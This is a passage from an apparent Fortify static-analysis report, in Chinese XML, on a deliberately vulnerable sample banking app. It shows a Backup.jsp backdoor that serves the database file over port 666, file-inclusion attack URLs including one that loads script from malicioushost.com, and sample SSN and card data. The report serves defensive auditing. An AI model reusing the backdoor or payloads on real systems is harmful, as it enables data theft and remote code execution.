大多数 null 指针问题会导致一般软件可靠性问题，但如果攻击者可能有意触发 null 指针间接引用，他们可以使用生成的异常绕过安全逻辑，或使应用程序显示调试信息，这些信息在规划后续攻击时十分有用。

示例：在下列代码中，程序员假设变量 foo 不是 null，并通过间接引用该对象来确认此假设。但是，程序员稍后通过检查 foo 是否为 null 发现事实与该假设相反。如果在 if 指令中检查时发现 foo 可能是 null，则在间接引用它时可能也为 null，并可能引起 null 指针异常。间接引用不安全，或者无需后续检查。


foo.setBar(val);
...
if (foo != null) {
	...
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>在间接引用可能为 null 的对象之前，请务必仔细检查。如有可能，在处理资源的代码的封装器中纳入 null 检查，以确保在所有情况下均会执行该检查，并最大限度地减少出错的位置。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="4E07441B08D2516EADDB3D0413E93641" ruleID="771E5717-2B4D-64FC-9A63-E16701E24D0D">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AdminUtil.java 中的 debugAdminRoles() 方法如果间接引用第 91 行上的 null 指针，将导致程序崩溃。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AdminUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/AdminUtil.java</FilePath>
                                <LineStart>91</LineStart>
                                <Snippet>
            rs = statement.executeQuery("SELECT rolename FROM auth WHERE roleid = " + roleid);
            rs.next();

            if (rs !=null &amp;&amp; rs.getString("rolename").equals("admin")) {</Snippet>
                                <TargetFunction>Dereferenced : rs()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B2D335E5817A4A13F5C6773C2D9F8484" ruleID="03840C20-F22B-B900-B76E-63258B717C77">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AdminUtil.java 中的 isAdmin() 方法如果间接引用第 56 行上的 null 指针，将导致程序崩溃。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AdminUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/AdminUtil.java</FilePath>
                                <LineStart>56</LineStart>
                                <Snippet>                statement =  conn.createStatement();
                rs = statement.executeQuery("SELECT rolename FROM auth WHERE roleid = " + roleid);
                rs.next();

                if (rs !=null &amp;&amp; rs.getString("rolename").equals("admin"))</Snippet>
                                <TargetFunction>Dereferenced : rs()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CCDD7734CE4A921EEE14AEACAA82D97C" ruleID="03840C20-F22B-B900-B76E-63258B717C77">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AdminUtil.java 中的 debugAdminRoles() 方法如果间接引用第 91 行上的 null 指针，将导致程序崩溃。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AdminUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/AdminUtil.java</FilePath>
                                <LineStart>91</LineStart>
                                <Snippet>
            rs = statement.executeQuery("SELECT rolename FROM auth WHERE roleid = " + roleid);
            rs.next();

            if (rs !=null &amp;&amp; rs.getString("rolename").equals("admin")) {</Snippet>
                                <TargetFunction>Dereferenced : rs()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Unreleased Resource: Sockets</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>文件 Backup.jsp 中的函数 _jspService() 有时无法释放由第 2 行的 ServerSocket() 函数分配的套接字。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>程序可能无法释放某个套接字。


资源泄露至少有两种常见的原因：

－ 错误状况及其他异常情况。

－ 未明确程序的哪一部份负责释放资源。

大部分 Unreleased Resource 问题只会导致常规软件可靠性问题，但如果攻击者能够故意触发资源泄漏，该攻击者就有可能通过耗尽资源池的方式发起 Denial of Service 攻击。

例 1：下面的方法绝不会关闭它所打开的套接字。在繁忙的环境中，这会导致 JVM 用尽它所有的套接字。


private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException
{
  Socket sock = new Socket(host, port);
  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));

  while ((String socketData = reader.readLine()) != null) {
    System.out.println(socketData);
  }
}


例 2：正常情况下，以下修复代码会正常关闭套接字以及任何相关联的数据流。但如果在读取输入或将数据输出到屏幕时出现异常，则不会关闭套接字对象。如果这种情况经常出现，系统将会耗尽所有套接字，无法处理更多连接。


private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException
{
  Socket sock = new Socket(host, port);
  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));

  while ((String socketData = reader.readLine()) != null) {
    System.out.println(socketData);
  }
  sock.close();
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>释放 finally 块中的套接字资源。Example 2 的代码可按以下方式重写：


private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException
{
  Socket sock;
  BufferedReader reader;

  try {
    sock = new Socket(host, port);
    reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));

    while ((String socketData = reader.readLine()) != null) {
        System.out.println(socketData);
    }
  }
  finally {
    safeClose(sock);
  }
}

public static void safeClose(Socket s) {
  if (s != null &amp;&amp; !s.isClosed()) {
    try {
      s.close();
    } catch (IOException e) {
      log(e);
    }
  }
}


此解决方法使用了一个助手函数，用以记录在尝试关闭套接字时可能产生的异常。该助手函数大约会在需要关闭套接字时重新使用。

此外，echoSocket() 方法不会将 sock 套接字对象初始化为 null。而是进行检查，以确保在调用 safeClose() 之前sock 不为 null。如果没有进行 null 检查，Java 编译器就会报告 sock 可能没有进行初始化。编译器做出这一判断源于 Java 可以检测未初始化的变量。如果用一种更加复杂的方法将 sock 初始化为 null，那么编译器就无法检测 sock 未经初始化便使用的情况。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 关闭套接字也会关闭通过 getInputStream 和 getOutputStream 获取的任何数据流。相反，关闭任何套接字数据流也会关闭整个套接字。如果对此有所怀疑，直接关闭两者是比较稳妥的方法。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="66A7FD328F6C53067555E9628C790506" ruleID="6DEAABAF-72E9-4AD6-8903-0EB8E858CB89">
                            <Category>Unreleased Resource: Sockets</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>文件 Backup.jsp 中的函数 _jspService() 有时无法释放由第 2 行的 ServerSocket() 函数分配的套接字。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>Backup.jsp</FileName>
                                <FilePath>pages/Backup.jsp</FilePath>
                                <LineStart>2</LineStart>
                                <Snippet>&lt;%
  java.net.ServerSocket srvr = new java.net.ServerSocket(666);

  java.net.Socket skt = srvr.accept();</Snippet>
                                <TargetFunction>srvr = new ServerSocket(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6EC7FECF97BA280471533BFC7F981883" ruleID="6DEAABAF-72E9-4AD6-8903-0EB8E858CB89">
                            <Category>Unreleased Resource: Sockets</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>文件 Backup.jsp 中的函数 _jspService() 有时无法释放由第 4 行的 accept() 函数分配的套接字。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>Backup.jsp</FileName>
                                <FilePath>pages/Backup.jsp</FilePath>
                                <LineStart>4</LineStart>
                                <Snippet>  java.net.ServerSocket srvr = new java.net.ServerSocket(666);

  java.net.Socket skt = srvr.accept();
  java.io.File pf = new java.io.File("webapps\\riches\\WEB-INF\\database\\riches.script");
  if (pf.exists()) {</Snippet>
                                <TargetFunction>skt = accept()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E404EA14A4EA3DA88362484B3BB97DC3" ruleID="6DEAABAF-72E9-4AD6-8903-0EB8E858CB89">
                            <Category>Unreleased Resource: Sockets</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>文件 Backup.jsp 中的函数 _jspService() 有时无法释放由第 4 行的 accept() 函数分配的套接字。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>Backup.jsp</FileName>
                                <FilePath>pages/Backup.jsp</FilePath>
                                <LineStart>7</LineStart>
                                <Snippet>  java.io.File pf = new java.io.File("webapps\\riches\\WEB-INF\\database\\riches.script");
  if (pf.exists()) {
    java.io.PrintWriter p_out = new java.io.PrintWriter(skt.getOutputStream(), true);
    java.io.FileInputStream fi = new java.io.FileInputStream(pf);
    java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(fi));</Snippet>
                                <TargetFunction>skt.getOutputStream()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Cookie Security: Cookie not Sent Over SSL</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>创建了 cookie，但未将 secure 标记设置为 true。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>现今的 Web 浏览器支持每个 cookie 的 secure 标记。如果设置了该标记，那么浏览器只会通过 HTTPS 发送 cookie。通过未加密的通道发送 cookie 将使其受到网络截取攻击，因此安全标记有助于保护 cookie 值的保密性。如果 cookie 包含私人数据或带有会话标识符，那么该标记尤其重要。


示例 1：在下面的示例中，在未设置 secure 标记的情况下，为响应添加了一个 Cookie。

	Cookie cookie = new Cookie("emailCookie", email);
	response.addCookie(cookie);


如果应用程序同时使用 HTTPS 和 HTTP，但没有设置 secure 标记，那么在 HTTPS 请求过程中发送的 cookie 也会在随后的 HTTP 请求过程中被发送。通过未加密的无线连接截取网络信息流对攻击者而言十分简单，因此通过 HTTP 发送 cookie（特别是具有会话 ID 的 cookie）可能会危及应用程序安全。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>对所有新 Cookie 设置 Secure 标记，指示浏览器不要以明文形式发送这些 Cookie。可通过调用 setSecure(true) 完成此配置。

例 2：

	Cookie cookie = new Cookie("emailCookie", email);
	cookie.setSecure(true);
	response.addCookie(cookie);
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E5E0B3F8CADF33D24BA38B2FE2D3D575" ruleID="AC87E716-8766-4F78-8851-86354C03A13B">
                            <Category>Cookie Security: Cookie not Sent Over SSL</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>创建了 cookie，但未将 secure 标记设置为 true。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>logout.jsp</FileName>
                                <FilePath>login/logout.jsp</FilePath>
                                <LineStart>8</LineStart>
                                <Snippet>        cookie.setPath(request.getContextPath());
        cookie.setMaxAge(0);
        response.addCookie(cookie);
        response.sendRedirect(request.getContextPath()+"/");
    }</Snippet>
                                <TargetFunction>addCookie(cookie)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="96D98981AA3B83686E6519EEF15B63E1" ruleID="AC87E716-8766-4F78-8851-86354C03A13B">
                            <Category>Cookie Security: Cookie not Sent Over SSL</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>创建了 cookie，但未将 secure 标记设置为 true。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>authCheck.jsp</FileName>
                                <FilePath>pages/auth/authCheck.jsp</FilePath>
                                <LineStart>24</LineStart>
                                <Snippet>        authCookie.setMaxAge(-1);
        authCookie.setPath(request.getContextPath());
        response.addCookie(authCookie);
    }
%&gt;</Snippet>
                                <TargetFunction>addCookie(authCookie)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Cookie Security: HTTPOnly not Set</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>程序在 logout.jsp 中第 5 行上创建了 cookie，但未能将 HttpOnly 标记设置为 true。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>所有主要浏览器均支持 HttpOnly Cookie 属性，可阻止客户端脚本访问 Cookie。Cross-Site Scripting 攻击通常会访问 Cookie，以试图窃取会话标识符或身份验证令牌。如果未启用 HttpOnly，攻击者就能更容易地访问用户 Cookie。


示例 1：以下代码会在未设置 HttpOnly 属性的情况下创建一个 Cookie。

javax.servlet.http.Cookie cookie = new javax.servlet.http.Cookie("emailCookie", email);
// Missing a call to: cookie.setHttpOnly(true);
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>在创建 Cookie 时启用 HttpOnly 属性。这可以通过调用（如果是 javax.servlet.http.Cookie）参数为 true 的 setHttpOnly(boolean) 方法实现。

示例 2：以下代码创建的 Cookie 与Example 1 中的代码创建的相同，但这次会将 HttpOnly 参数设置为 true。

javax.servlet.http.Cookie cookie = new javax.servlet.http.Cookie("emailCookie", email);
cookie.setHttpOnly(true);


已开发出了多种绕过将 HttpOnly设置为 true 的机制，因此它并非完全有效。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E7A975169B243B2E1E4C28A0445919B2" ruleID="1733FB59-CC13-4E99-9638-3D45FEEE9BE1">
                            <Category>Cookie Security: HTTPOnly not Set</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>程序在 authCheck.jsp 中第 19 行上创建了 cookie，但未能将 HttpOnly 标记设置为 true。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>authCheck.jsp</FileName>
                                <FilePath>pages/auth/authCheck.jsp</FilePath>
                                <LineStart>19</LineStart>
                                <Snippet>        Cookie authCookie = null;
        if (request.isUserInRole("admin"))
            authCookie = new Cookie("authType", "0");
        else
            authCookie = new Cookie("authType", "1");</Snippet>
                                <TargetFunction>authCookie = new Cookie(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1B4B26EB1839568FBE1553CC2822C5E9" ruleID="1733FB59-CC13-4E99-9638-3D45FEEE9BE1">
                            <Category>Cookie Security: HTTPOnly not Set</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>程序在 logout.jsp 中第 5 行上创建了 cookie，但未能将 HttpOnly 标记设置为 true。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>logout.jsp</FileName>
                                <FilePath>login/logout.jsp</FilePath>
                                <LineStart>5</LineStart>
                                <Snippet>    {
        session.invalidate();
        Cookie cookie = new Cookie("authType","");
        cookie.setPath(request.getContextPath());
        cookie.setMaxAge(0);</Snippet>
                                <TargetFunction>cookie = new Cookie(...)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Dangerous File Inclusion</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>文件 Register.jsp 将一个未验证的文件名传递给了第 74 行的一个动态 include 指令。如果允许未经验证的用户输入控制动态包含在 JSP 中的文件，会导致恶意代码的执行。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>许多现代网络编写语言都能够在一个封装的文件内包含附加的源文件，从而使代码可以重用和模块化。这种能力经常用于赋予应用程序标准外观（应用模板），因而，人们可以共享各种功能而不需要借助编译的代码，或将代码分解成较小的更好管理的文件。各个包含文件都会作为主文件的一部分进行解析，并采用相同的方式来执行。当未验证的用户输入控制了所包含文件的路径时，就会发生 File inclusion 漏洞。


例 1：以下代码是 Local File Inclusion 漏洞的示例。示例代码采用了用户指定的模板名称，并将该名称包含在要呈现的 JSP 页面中。

...
&lt;jsp:include page="&lt;%= (String)request.getParameter(\"template\")%&gt;"&gt;
...

如果攻击者为动态包含指令指定一个有效文件，则该文件的内容会传送给将在页面上呈现的 JSP 解释器。

如果攻击者采用这种手段发起攻击，

specialpage.jsp?template=/WEB-INF/database/passwordDB

JSP 解释器就会将 /WEB-INF/database/passwordDB 文件的内容在 JSP 页面上呈现，从而对系统安全造成威胁。

更为糟糕的是，如果攻击者可以指定一条路径来指向被自己控制的远程站点，那么动态 include 指令就会执行由攻击者提供的任意恶意代码。

示例 2：此示例代码会使用 c:import 标签将用户指定的远程文件导入当前的 JSP 页面。

...
&lt;c:import url="&lt;%= request.getParameter("privacy")%&gt;"&gt;
...

这种攻击手段

policy.jsp?privacy=http://www.malicioushost.com/attackdata.js

可从被攻击者控制的远程站点将恶意代码注入当前 JSP 页面。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>不要允许未验证的用户输入控制动态包含指令中使用的路径。而应当采取一种间接手段：创建一份合法包含文件列表，仅允许用户从该列表中进行选择。利用这种方法，用户就不能直接从 file system 中指定某一个文件。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，Fortify 安全编码规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="00D8D3F1F0B774BF7262BE365A2693FE" ruleID="04C9E878-3911-4DE5-AF28-938B363AF9100">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>文件 Security.jsp 将一个未验证的文件名传递给了第 6 行的一个动态 include 指令。如果允许未经验证的用户输入控制动态包含在 JSP 中的文件，会导致恶意代码的执行。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>Security.jsp</FileName>
                                <FilePath>pages/content/Security.jsp</FilePath>
                                <LineStart>6</LineStart>
                                <Snippet>&lt;td valign="top" align="center"&gt;

    &lt;c:import url="&lt;%=request.getParameter(\"privacy_statement\")%&gt;"/&gt;

    &lt;br/&gt;</Snippet>
                                <TargetFunction>http://java.sun.com/jsp/jstl/core/import/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>Security.jsp</FileName>
                                <FilePath>pages/content/Security.jsp</FilePath>
                                <LineStart>6</LineStart>
                                <Snippet>&lt;td valign="top" align="center"&gt;

    &lt;c:import url="&lt;%=request.getParameter(\"privacy_statement\")%&gt;"/&gt;

    &lt;br/&gt;</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CB9A2D45D4B2427198577FF4C714AEE7" ruleID="6E4F370A-5DB4-4A3E-8CAC-C691A9DE449A0">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>文件 Register.jsp 将一个未验证的文件名传递给了第 74 行的一个动态 include 指令。如果允许未经验证的用户输入控制动态包含在 JSP 中的文件，会导致恶意代码的执行。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>Register.jsp</FileName>
                                <FilePath>login/Register.jsp</FilePath>
                                <LineStart>74</LineStart>
                                <Snippet>                        Example: http://yoursite.com/riches/login/Register.action?template=/pages/acquired/first_riches_invest.jsp
                        --&gt;
                        &lt;jsp:include page="&lt;%= request.getParameter(\"template\") != null?(String)request.getParameter(\"template\"):\"/pages/acquired/default.jsp\" %&gt;"/&gt;

                        &lt;table cellpadding="0" cellspacing="0" border="0" align="left" id="right" valign="top"&gt;</Snippet>
                                <TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>Register.jsp</FileName>
                                <FilePath>login/Register.jsp</FilePath>
                                <LineStart>74</LineStart>
                                <Snippet>                        Example: http://yoursite.com/riches/login/Register.action?template=/pages/acquired/first_riches_invest.jsp
                        --&gt;
                        &lt;jsp:include page="&lt;%= request.getParameter(\"template\") != null?(String)request.getParameter(\"template\"):\"/pages/acquired/default.jsp\" %&gt;"/&gt;

                        &lt;table cellpadding="0" cellspacing="0" border="0" align="left" id="right" valign="top"&gt;</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Database Bad Practices: Use of Restricted Accounts</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>已尝试使用以下帐户之一连接数据库：admin、管理员、来宾、超级用户或 sa。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>Windows Azure SQL 数据库仅支持 SQL Server 身份验证。不支持 Windows 身份验证（集成安全性）。用户每次连接 Windows Azure SQL 数据库时必须提供凭据（登录名和密码）。根据 Microsoft Windows Azure SQL 数据库常规指导原则和限制，以下帐户名不可用：admin、管理员、来宾、超级用户、sa。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>请勿在数据库脚本中使用以下帐户：admin、管理员、来宾、超级用户或 sa。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="D925A56B4ED2C4FFAC299500DD8A0CCF" ruleID="6ED61415-B5A0-41AC-B712-79331A7B28A8">
                            <Category>Database Bad Practices: Use of Restricted Accounts</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>已尝试使用以下帐户之一连接数据库：admin、管理员、来宾、超级用户或 sa。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>create_db.sql</FileName>
                                <FilePath>create_db.sql</FilePath>
                                <LineStart>79</LineStart>
                                <Snippet>insert into account (username, acctno, balance, ccn) values ('dave',  '2334345546', 545411.00, '4019 3364 8220 5035');

insert into profile (id, username, password, firstname, lastname, email, ssno) values (0, 'admin', 'admin', 'Andrew', 'Dmin', 'admin@example.com', '111-22-9845');
insert into profile (id, username, password, firstname, lastname, email, ssno) values (1, 'gary', 'gary', 'Gary', 'Skippee', 'gary@example.com', '737-45-6788');
insert into profile (id, username, password, firstname, lastname, email, ssno) values (2, 'eddie', 'eddie', 'Eddie', '', 'ed@example.com', '730-45-1694');</Snippet>
                                <TargetFunction>StringLiteral()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="95914476E6D530488AAB438C59FC43B2" ruleID="6ED61415-B5A0-41AC-B712-79331A7B28A8">
                            <Category>Database Bad Practices: Use of Restricted Accounts</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>已尝试使用以下帐户之一连接数据库：admin、管理员、来宾、超级用户或 sa。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>create_db.sql</FileName>
                                <FilePath>create_db.sql</FilePath>
                                <LineStart>79</LineStart>
                                <Snippet>insert into account (username, acctno, balance, ccn) values ('dave',  '2334345546', 545411.00, '4019 3364 8220 5035');

insert into profile (id, username, password, firstname, lastname, email, ssno) values (0, 'admin', 'admin', 'Andrew', 'Dmin', 'admin@example.com', '111-22-9845');
insert into profile (id, username, password, firstname, lastname, email, ssno) values (1, 'gary', 'gary', 'Gary', 'Skippee', 'gary@example.com', '737-45-6788');
insert into profile (id, username, password, firstname, lastname, email, ssno) values (2, 'eddie', 'eddie', 'Eddie', '', 'ed@example.com', '730-45-1694');</Snippet>
                                <TargetFunction>StringLiteral()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Dynamic Code Evaluation: Unsafe Deserialization</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>在运行时对用户控制的对象流进行反序列化，会让攻击者有机会在服务器上执行任意代码、滥用应用程序逻辑和/或导致 Denial of Service。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>Java 序列化会将对象图转换为字节流（包含对象本身和必要的元数据），以便通过字节流进行重构。开发人员可以创建自定义代码，以协助 Java 对象反序列化过程，在此期间，他们可以使用其他对象或代理替代反序列化对象。在对象重构过程中，并在对象返回至应用程序并转换为预期的类型之前，会执行自定义反序列化过程。到开发人员尝试强制执行预期的类型时，代码可能已被执行。

在必须存在于运行时类路径中且无法由攻击者注入的可序列化类中，会自定义反序列化例程，所以这些攻击的可利用性取决于应用程序环境中的可用类。令人遗憾的是，常用的第三方类，甚至 JDK 类都可以被滥用，导致 JVM 资源耗尽、部署恶意文件或运行任意代码。&#xD;

某些协议会在传输层后台使用 Java 序列化。这些协议的示例包括 RMI 和 JMX。

示例 1：下面是可公开披露的 RMI 接口的示例，其包含的方法具有一个或多个参数。远程调用这些方法时，将在服务器上对参数进行反序列化，使攻击者可以注入恶意对象图。

public interface MyService extends java.rmi.Remote {
    public Object doSomething (Object arg0) throws RemoteException;
    public Object doSomethingElse (Object arg0, Object arg1) throws RemoteException;
    ...
}


示例 2：JMX MBeans 还会使用 Java 序列化来传输调用参数。在下面的示例中，MyManagedBean 类方法将公开给客户端。

MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
ObjectName name = new ObjectName("com.example:type=MyManagedBean");
MyManagedBean mbean = new MyManagedBean();
mbs.registerMBean(mbean, name);
